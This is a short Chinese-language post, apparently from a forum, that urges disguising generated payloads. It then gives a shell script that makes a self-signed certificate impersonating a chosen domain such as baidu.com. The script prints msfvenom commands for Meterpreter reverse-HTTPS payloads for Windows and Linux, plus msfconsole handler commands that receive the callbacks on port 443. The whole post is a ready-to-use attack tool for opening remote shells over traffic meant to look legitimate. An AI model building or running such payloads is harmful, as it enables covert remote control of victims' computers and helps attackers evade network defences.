一直用的很开心
生成的payload一定要包装下
```sh
#!/usr/bin/env sh
if [ ! -n "$1" ] ;then
    echo "you have not input a agrs!"
else
    echo "the args you input is $1\n msf.sh www.baidu.com 192.168.132.11"
fi
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509  -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=$1" -keyout $1.key  -out $1.crt
cat $1.key  $1.crt > $1.pem
rm -f $1.key $1.crt
echo "Powershell"
echo msfvenom -p windows/meterpreter/reverse_https LHOST=$2 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./$1.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o launch-paranoid.bat
echo "exe"
echo msfvenom -p windows/meterpreter_reverse_https LHOST=$2 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./$1.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe
echo "elf"
echo msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$2 LPORT=443 LURI=/search/ PayloadUUIDTracking=true HandlerSSLCert=./$1.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f elf -o launch-paranoid-stageless -a x86 --platform linux
echo "handler"
echo msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST $2; set LPORT 443; set HandlerSSLCert ./$1.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
echo msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST $2; set LPORT 443; set HandlerSSLCert ./$1.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
echo msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter_reverse_https; set LHOST $2; set LPORT 443; set LURI /search/;set HandlerSSLCert ./$1.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
```
